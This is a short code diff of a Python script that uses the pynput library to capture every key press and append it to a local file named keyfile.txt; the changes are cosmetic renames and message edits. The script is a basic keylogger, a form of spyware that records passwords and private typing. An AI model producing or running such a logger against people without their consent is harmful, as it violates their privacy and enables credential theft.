@@ -1,13 +1,13 @@
-from pynput import keyboard
 
+from pynput import keyboard
 def keyPress(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
         try:
-            ch= key.char
-            logKey.write(ch)
+            c= key.char
+            logKey.write(c)
         except:
-            print("Error getting char")
+            print("Special char Error")
 
 if __name__ == "__main__":
     listen = keyboard.Listener(on_press=keyPress)
